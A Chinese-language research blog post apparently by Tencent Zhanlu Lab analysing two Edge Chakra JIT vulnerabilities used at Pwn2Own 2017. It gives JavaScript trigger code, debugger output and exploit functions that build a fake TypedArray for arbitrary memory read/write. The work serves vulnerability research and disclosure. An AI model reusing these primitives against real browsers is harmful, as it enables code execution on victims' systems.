> 原文链接: https://www.anquanke.com//post/id/86062 


# 【技术分享】Pwn2Own 2017 再现上帝之手


                                阅读量   
                                **134284**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



**[![](https://p0.ssl.qhimg.com/t017691e70f6cf79934.jpg)](https://p0.ssl.qhimg.com/t017691e70f6cf79934.jpg)**

**0x背景**

今年3月结束的Pwn2own比赛中，湛泸实验室1秒内攻破史上最高难度的Edge浏览器，拿到首个单项最高分14分。此次比赛湛泸实验室准备了多个Edge漏洞和windows10内核提权漏洞，相关漏洞信息已经报告给微软。**本文粗略介绍一下Pwn2Own比赛中湛泸实验室所用到的两个Edge漏洞，以及漏洞利用中的DVE（Data-Virtualization Execute）技术。**这两个Edge漏洞我们实验室都完成了利用，在利用的细节上和之前IE上的cve-2014-6332有着异曲同工之妙。即**DVE技术的基本思想：程序的一切皆是数据，通过修改程序的关键数据结构来控制程序执行，从而绕过所有Mitigation机制。**下面笔者将较为细致地分析Pwn2own比赛的漏洞成因和利用过程，现在就开始Pwn2Own的旅程吧。Let’s go!!!!

<br>

**x01 漏洞简介**

去年，湛泸实验室发现Chakra引擎中ArrayBuffer对象的两个神洞，一个越界访问(CVE:2017-0234)和一个释放后重用(CVE:2017-0236)。这两个漏洞的特殊之处在于漏洞的触发路径都在chakra引擎生成的jit 代码中。下面，笔者就和大家分享这两个漏洞的相关细节。

<br>

**x2漏洞成因**

先看下面这段JS代码：



```
function write(begin,end,step,num)
`{`
 for(var i=begin;i&lt;end;i+=step) view[i]=num;
`}`
var buffer =  new ArrayBuffer(0x10000);
var view   =  new Uint32Array(buffer);
write(0,0x4000,1,0x1234);
write(0x3000000e,0x40000010,0x10000,1851880825);
```

其中，执行write(0,0×4000,1,0x1234)这句JS，会让chakra引擎针对write函数中的for循环生成Jit code。JIT生成的循环代码调用入口在chakra!Js::InterpreterStackFrame::DoLoopBodyStart，我们对这个函数下断，即可跟踪到write函数中for循环对应的Jit code。

JIT经过一些列准备工作，最终来到JITLoop代码部分： 

[![](https://p4.ssl.qhimg.com/t0108580dcee28589e0.jpg)](https://p4.ssl.qhimg.com/t0108580dcee28589e0.jpg)

看一下JIT对这个for循环生成的汇编代码： 

[![](https://p5.ssl.qhimg.com/t0115145dad118e4329.jpg)](https://p5.ssl.qhimg.com/t0115145dad118e4329.jpg)

代码稍微行数多一点，分开解释分析，for循环头部是获取for循环相关的参数

[![](https://p0.ssl.qhimg.com/t01fd3765c499065318.jpg)](https://p0.ssl.qhimg.com/t01fd3765c499065318.jpg)



```
R12=0x0001000000010000  //这里是取出for循环的step=0x0001000000010000
R13=0x000100006e617579  //这里是取出view数组要赋予的值0x000100006e617579
R14=0x0001000040000010  //这里是取出for循环的end=0x0001000040000010
R15=0x000100003000000e  //这里是取出for循环的start=0x000100003000000e
```

在这里可以发现每一个数值的高四位有一个1，是用来区分这个值是对象还是int类型的

1 表示数据int，0 表示obj

[![](https://p1.ssl.qhimg.com/t016086cbf0d3aef792.jpg)](https://p1.ssl.qhimg.com/t016086cbf0d3aef792.jpg)



```
0:010&gt;
rax=0000000000000001 rbx=00000186e9c00000 rcx=00000186e9800dc0
rdx=0000000000010000 rsi=00000186e95d68c4 rdi=00000036be1fb900
rip=00000187e9f00122 rsp=00000036be1fb5d0 rbp=00000036be1fb670
 r8=000000003000000e  r9=0000000040000010 r10=000100006e617579
r11=0000000000000001 r12=000100006e617579 r13=000100006e617579
r14=0001000040000010 r15=000100003000000e
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246   
mov     dword ptr [rbx+r8*4],r12d ds:00000187`a9c00038=????????
```

最终代码运行到此处，rbx是buffer对象的内存基地址，r8是数组索引0x3000000e，r12给数组赋予的值，整个过程没有检测索引的范围造成了数组越界。当然漏洞不仅仅这一个，仔细推敲上述过程，我们可以发现，JIT在使用buffer对象的缓冲区域时并没有检测buffer对象是否被分离释放，这就是我们发现的第二个漏洞。可能细心点的读者都发现了，写入的地址不可访问，都是?????????，那为什么漏洞会利用成功而且不崩溃呢？请看下文。

<br>

**0x03 漏洞利用**

只有crash是远远不够的，还记得yuange曾经说过：”exp的价值远远大于poc”。下面笔者将分析一下两个漏洞的利用技术，两个漏洞成因极为相似，所以在利用技术上也很相近。

触发UAF漏洞主要代码如下：



```
var buffer = new ArrayBuffer(0x10000);
var view = new Uint32Array(buffer);
var worker = new Worker('uaf1.js');
worker.postMessage(buffer,[buffer]);
worker.terminate();
```

主要逻辑：

1）申请一个ArrayBuffer类型的数组变量buffer对象

2）紧接着新建Uint32Array类型的数组对象view,引用上面的buffer对象

3）通过调用postMessage(buffer,[buffer])和terminate()会将buffer对象申请的缓冲区内存彻底释放,这里是触发UAF的关键。work.postMessage移交buffer对象所有权, terminate()结束worker线程的时候会释放掉buffer这个对象原来申请的内存。

4）然而在类型数组view中却仍然保留着buffer对象申请的缓冲区内存的引用，并且引用时没有做检查,所以造成UAF 漏洞。.

越界代码因为ArrayBuffer对象申请4G虚拟空间，占位内存必须在ArrayBuffer的4G空间之后，这样两个漏洞利用就只有占位空间不一样，利用TypedArray写内存的索引不一样。UAF漏洞占位在原有buffer对象申请的缓冲区空间，OOB漏洞占位在其后4G空间。这样OOB漏洞写占位内存时，索引需要增加0x100000000/4=0x40000000，其它都相同。

**1. 详细分析**

我们来跟踪一下UAF的漏洞利用相关代码。

1）首先，申请一个ArrayBuffer类型的数组变量buffer，找到这个buffer变量，看一下内存结构

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a28bb2e7d74e3622.jpg)

rcx是ArrayBuffer对象，0x00000186-e9c00000是buffer对象申请的缓冲区内存，0x00000000-00010000 是buffer长度

[![](https://p2.ssl.qhimg.com/t01be08c4ea97f78b73.jpg)](https://p2.ssl.qhimg.com/t01be08c4ea97f78b73.jpg)

下面是buffer的内存部分大小0x10000

[![](https://p4.ssl.qhimg.com/t01088d822e56a7d2cd.jpg)](https://p4.ssl.qhimg.com/t01088d822e56a7d2cd.jpg)

[![](https://p4.ssl.qhimg.com/t011bf60295426ad29d.jpg)](https://p4.ssl.qhimg.com/t011bf60295426ad29d.jpg)

2）紧接着新建Uint32Array类型的变量view,引用上面的buffer

然后write(0,0×4000,1,0x1234);   //大循环操作内存,让chakra引擎生成JIT代码

使用view对象操作ArraryBuffer的内存,看看被修改的buffer对象缓冲区这块内存，

内存布局如下

[![](https://p0.ssl.qhimg.com/t0139336aba73e0565c.jpg)](https://p0.ssl.qhimg.com/t0139336aba73e0565c.jpg)

3）通过调用postMessage(buffer,[buffer])和terminate()会将buffer的缓冲区内存空间彻底释放。执行terminate之后释放了buffer对象的缓冲区内存，buffer指针被置空，长度值为0，（0x00000001-00000000实际代表长度为零）。

[![](https://p5.ssl.qhimg.com/t014f2ea8e295264eae.jpg)](https://p5.ssl.qhimg.com/t014f2ea8e295264eae.jpg)

```
worker.postMessage(buffer,[buffer]);
```

worker.terminate();当worker调用postMessage的时候会发生Detach操作

[![](https://p3.ssl.qhimg.com/t01aaa06b41436fcc4b.jpg)](https://p3.ssl.qhimg.com/t01aaa06b41436fcc4b.jpg)

会调用 Js::ArrayBufferDetachedStateBase *__fastcall Js::ArrayBuffer::DetachAndGetState—&gt;

chakra!Js::ArrayBuffer::ClearParentsLength 把对象的长度清掉

[![](https://p1.ssl.qhimg.com/t0114514d6726b9f6cf.jpg)](https://p1.ssl.qhimg.com/t0114514d6726b9f6cf.jpg)

此时还没有清掉内存，后续函数会把内存释放掉。

4）然而在变量view 中却仍然保留着buffer对象缓冲区的引用，所以造成UAF 漏洞。

下面内存是view对象的，此时View对buffer对象申请的缓冲区的引用仍然存在，也就是地址并没有清零

[![](https://p3.ssl.qhimg.com/t01803d3aff7ab7b4b2.jpg)](https://p3.ssl.qhimg.com/t01803d3aff7ab7b4b2.jpg)

此时我们看一下内存情况，buffer对象申请的缓冲区是不能被访问的

[![](https://p1.ssl.qhimg.com/t0145ec875c52e3db3b.jpg)](https://p1.ssl.qhimg.com/t0145ec875c52e3db3b.jpg)

[![](https://p3.ssl.qhimg.com/t01a4990877234ab775.jpg)](https://p3.ssl.qhimg.com/t01a4990877234ab775.jpg)

已经被系统给回收了。

这样我们再占位这内存后，利用view对象去操作这块内存就造成了UAF漏洞。

**2. 漏洞利用&amp;Pwn**

漏洞原因已经比较清晰了，but, How to Pwn?继续分析，

利用技术要点：

1）UAF漏洞在释放buffer对象的缓冲区后，紧接着通过分配Array 来占用已释放的缓冲区内存。OOB漏洞不需要前面的释放buffer对象缓冲区代码，最终占位的是缓冲区4G后的空间。

代码如下：



```
for(var i=0;i&lt;0x1000;i+=1)
`{`
arr[i]=new Array(0x800);
arr[i][1]=25959;
arr[i][0]=0;
｝
```

2）通过write向占位的arr写入标记，然后检测arr定位到占位成功的arr。OOB漏洞调用write写的时候，索引begin和end都需要加上0x40000000。



```
for(var i=0;i&lt;0x1000;i+=1)
`{`
arr[i]=new Array(0x800);
arr[i][1]=25959;
arr[i][0]=0;
write(0x0e,0x00010,0x1000,1851880825);
if(arr[i][0]==1851880825)
`{`
```

1851880825 这个奇怪数值是什么呢？程序员看到这个数字大脑绝对是崩溃的，其实1851880825是”yuange”字符串中的”yuan”,25959是”yuange”中的”ge”,占位成功的话就拼接出”yuange”这个字符串。

[![](https://p2.ssl.qhimg.com/t018bce0306d9b9e24a.jpg)](https://p2.ssl.qhimg.com/t018bce0306d9b9e24a.jpg)

然后利用占位的数组，精心的构造一个对象，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b0383f1c51b84953.jpg)

0x6e617579是标记，0x6567也是一个标记



```
//arr[i+1](arrvar) 的数据区紧邻arr[i](arrint)的数据区，都在释放了的buffer对象的缓冲区空间内
arr[i+1]=new Array(0x400);
arr[i+1][1]=buffer;
arr[i+1][0]=0;
getarrint(i);
｝
｝
函数getarrint 的定义如下：
function getarrint(i)
`{`
arr[i].length=0x10000;
arrint=arr[i];
arrvar=arr[i+1];
write(0x09,0x001000,0x100000,0x0001000);
write(0x0a,0x001000,0x100000,0x0001000);
`}`
//这里两个write修改占位成功的arrint 对象的segment 的size和length 字段
```

[![](https://p2.ssl.qhimg.com/t01096882d9c4fe1fcd.jpg)](https://p2.ssl.qhimg.com/t01096882d9c4fe1fcd.jpg)

下面可以看到已经成功修改了segment 的size和length字段

之前这个对象内存如下0x00000002 代表存储int的个数,从后面的内存可以看到，这里存储了0x6e617579和0x00006567两个值，0x6e617579是JIT代码写进来的，覆盖了arr[i][0]=0这个值。

[![](https://p0.ssl.qhimg.com/t01bee576d1c21e91c0.jpg)](https://p0.ssl.qhimg.com/t01bee576d1c21e91c0.jpg)

修改这个有什么作用呢？其实此时已经得到了一个长度为0x1000的seg，

seg中元素个数为0x1000,此时就能越界对后面内存进行读写访问了。

这个先放在这，后面要用到。下一步就是伪造一个fakeview，进而完成任意地址读写。

3)此时的内存布局如下：



```
Buffer--------&gt; ---------------------------
| 0x20 内存块头部|
Arrint.seg---------&gt;| |
| |
| |
| 0x3000 内存块|
| |
| |
Arrvar.seg———&gt;| |
| |
| |
| |
| |
```

内存就是下面这样，注意连个地址之间相隔0x3020,中间是占位产生的数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01780739d08bb67188.jpg)

arrint是NativeIntArray, 其seg的size为0x802，每个元素的长度为4byte，共为0x802*4+0x20+0x18=0x2040bytes长度，然后因为内存页对齐的原因为0x3000byte，所以中间空余了0x3000。此时我们可以通过arrint越界去读写arrvar的buffer部分了，这就已经完成对象地址的泄露了。



```
function getobjadd(myvar)
`{`
  arrvar[3]=myvar;
  uint32[0]=arrint[0xc06];
  return  arrint[0xc07]*0x100000000+uint32[0];    
`}`
```

4)紧接着通过调用fakeview 函数来伪造一个完全可控的TypedArray对象myview 实现任意地址读写。



```
var buffer1 =  new ArrayBuffer(0x100);
var view1    =  new Uint32Array(buffer1);
var view2    =  new Uint32Array(buffer1);
var view3    =  new Uint32Array(buffer1);
var view4    =  new Uint32Array(buffer1);
function fakeview( )
`{`
arrint.length=0xffff0000;  //arrint长度修改
```

[![](https://p3.ssl.qhimg.com/t019dedf979afd81102.jpg)](https://p3.ssl.qhimg.com/t019dedf979afd81102.jpg)



```
arrvar[0]=buffer1;
arrvar[1]=view2;
arrvar[2]=0;
//修改arrint 的segment.next 指向view2+0x28
write(0x00000d,0x001000,0x100000,arrint[0xc03]);
write(0x00000c,0x001000,0x100000,arrint[0xc02]+0x28);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018002cce3034511cc.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0120ee693e9328e918.jpg)

View+0x28位置是存放的buffer1对象的地址:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0131069e947f4133a5.jpg)

使用arrint[0xc00]越界就可以获取到buffer1对象地址0x186-e96a5300低4字节。 

[![](https://p2.ssl.qhimg.com/t01b547c7a1f0ea88fb.jpg)](https://p2.ssl.qhimg.com/t01b547c7a1f0ea88fb.jpg)

[![](https://p5.ssl.qhimg.com/t01699c1d02f5e55176.jpg)](https://p5.ssl.qhimg.com/t01699c1d02f5e55176.jpg)



```
uint32[0]=arrint[0xc00];
index=uint32[0];
//中间使用unit32[0]是用来做符号转换的，index就是buffer1对象的地址低4字节。因为seg.next指向view2+0x28,view2+0x28的值为buffer1,所以下一个seg的seg.left就是buffer1的低4字节，这个段的索引号就是从index开始。
```

Seg的头长度0x18，后面接的是具体数组数据，这样0x28+0x18=0x40，view2对象的长度是0x40，这时候seg的数组数据区域就刚好指向下一个view对象0x186`e9800dc0，可能是紧挨着的view1或者view3。



```
//通过越界读复制view1或者view3 对象的0x40字节到view4 的buff 区域
for(var i=0;i&lt;0x10;i++) view4[i]=arrint[index+i];
//恢复segment.next
write(0x0d,0x0001000,0x100000,0);
write(0x0c,0x0001000,0x100000,0);
```

View4对象内存如下，View4的buffer地址为0x17e-e425ae40，现在这个已经是我们伪造出来的myview的结构体部分

[![](https://p2.ssl.qhimg.com/t0154a823238495727a.jpg)](https://p2.ssl.qhimg.com/t0154a823238495727a.jpg)

myview 的内存布局如下：

[![](https://p4.ssl.qhimg.com/t01b27c128059f90426.jpg)](https://p4.ssl.qhimg.com/t01b27c128059f90426.jpg)



```
arrint[0xc04]=view4[0x0e];
arrint[0xc05]=view4[0x0f];
// view4[0xe]和view4[0x0f]对应的就是view4引用的buffer1对象的数据缓冲区，也就是伪造的myview对象的地址，取出来保存到arrvar[2]位置。这样就把伪造的view对象通过arrvar[2]做对象引出，可以JS直接引用。
myview=arrvar[2];
`}`
```

得到了需要的伪造的TypedArray对象myview，整个对象结构体在view4里，可以通过view4去修改。myview 的内存布局如下：<br>

[![](https://p4.ssl.qhimg.com/t01b27c128059f90426.jpg)](https://p4.ssl.qhimg.com/t01b27c128059f90426.jpg)

myview是Uint32Array对象,结构体中存了一个64位数组数据缓冲区指针，我们已经具备了修改这个对象结构的能力，那么我们可以通过修改这个指针，通过类型数组做到任意地址读写。

5）此时myview 便伪造成功，由于myview 整个都在view4 的buff 空间中，所以view4 可以对myview 进行任意读写，而此时myview 也被edge 识别为Uint32Array 对象类型。即可实现任意读写，代码如下：



```
function readuint32(address)
`{`
view4[0x0e]=address%0x100000000;
view4[0x0f]=address/0x100000000;
return myview[0];
`}`
function writeuint32(address,num)
`{`
view4[0x0e]=address%0x100000000;
view4[0x0f]=address/0x100000000;
myview[0]=num;
`}`
```

加上前面已经实现的任意对象地址读取



```
function getobjadd(myvar)
`{`
  arrvar[3]=myvar;
  uint32[0]=arrint[0xc06];
  return  arrint[0xc07]*0x100000000+uint32[0];    
`}`
```

这样可以获取任意我们需要的对象地址，然后读写和修改对象数据，继续bypass各种利用缓解措施，得到代码执行能力等，从这里开始就获得了和上帝一样的能力。

<br>

**0x04漏洞攻击(Fire Now!!!)**

攻击效果就是百发百中，指哪打哪。

[![](https://p0.ssl.qhimg.com/t01f45f30af9cae8905.gif)](https://p0.ssl.qhimg.com/t01f45f30af9cae8905.gif)

<br>

**0x05 漏洞精华**

笔者才疏学浅，深知自己不能完全领会漏洞利用的全部，但是也总结一下调试过程中发现漏洞利用精华和奇妙的地方，

1） 这个漏洞在没有占位成功的时候，向已经释放的内存中写入数据并不会导致程序崩溃，这就大大的增加了漏洞利用程序的稳定性。

调试的时候，发现这个buffer在没有完成占位的情况下，对buffer的写入操作并不会崩溃,这个异常会被edge自己处理掉，不会导致崩溃发生，这样就会让exploit程序非常的稳定。也是非常感叹这是两个非常好用的神洞啊。也就是文中前面留下的那个神秘问题。

[![](https://p5.ssl.qhimg.com/t01e56bf3ef7f37cfd5.jpg)](https://p5.ssl.qhimg.com/t01e56bf3ef7f37cfd5.jpg)

2） 漏洞利用精髓自然是DVE方法精确的数据控制能力，通过漏洞的内存修改能力,修改arrint对象的seg的数据结构,然后arrint和arrvar互相配合实现类型混淆，可以对对象任意读写伪造，这和cve-2014-6332的DVE利用代码的两个数组交错修改具有异曲同工之秒。完成任意地址读写，然后通过修改对象数据，打开“上帝模式”。

<br>

**0xFF总结**

通过上述分析，笔者逐渐领悟到DVE技术的精髓：通过修改关键数据结构来获取任意数据操纵的能力，这就是袁哥所说的“上帝之手”。然后借”上帝之手”绕过dep+alsr+cfg+rfg等漏洞防御技术，最后配合内核漏洞，完成整个Exploit Chain的攻击。感谢分析过程中yuange的指导和实验室小伙伴的帮助，笔者能力有限，分析有误的地方还望大家指出。最后，欢迎对二进制漏洞研究感兴趣的小伙伴加入腾讯湛泸实验室，发送简历到yuangeyuan@tencent.com。

部分关键利用代码：



```
for(var i=0;i&lt;0x1000;i+=1)
`{`
   arr[i]=new Array(0x800);
   arr[i][1]=25959;
   arr[i][0]=0;
   write(0x0e,0x00010,0x1000,1851880825);
   if(arr[i][0]==1851880825)
   `{`      
      arr[i+1]=new Array(0x400);
      arr[i+1][1]=buffer;
      arr[i+1][0]=0;
      getarrint(i);
      fakeview();
      document.write("&lt;br&gt;&lt;br&gt; find i="+i+"&lt;br&gt;");
      bypassdepcfg();
      break;
   `}`
`}`
function getarrint(i)
`{`  
  arr[i].length=0x10000;
  arrint=arr[i];  
  arrvar=arr[i+1];
  write(0x09,0x001000,0x100000,0x0001000);
  write(0x0a,0x001000,0x100000,0x0001000);
`}`
function fakeview( )
`{`
  arrint.length=0xffff0000;  
  arrvar[0]=buffer1;
  arrvar[1]=view2;
  arrvar[2]=0;
  write(0x0d,0x001000,0x100000,arrint[0xc03]);
  write(0x0c,0x001000,0x100000,arrint[0xc02]+0x28);    
  uint32[0]=arrint[0xc00];
  index=uint32[0];
  for(var i=0;i&lt;0x10;i++) view4[i]=arrint[index+i];
  write(0x0d,0x0001000,0x100000,0);
  write(0x0c,0x0001000,0x100000,0);   
  arrint[0xc04]=view4[0x0e];
  arrint[0xc05]=view4[0x0f];
  myview=arrvar[2];
`}`
```
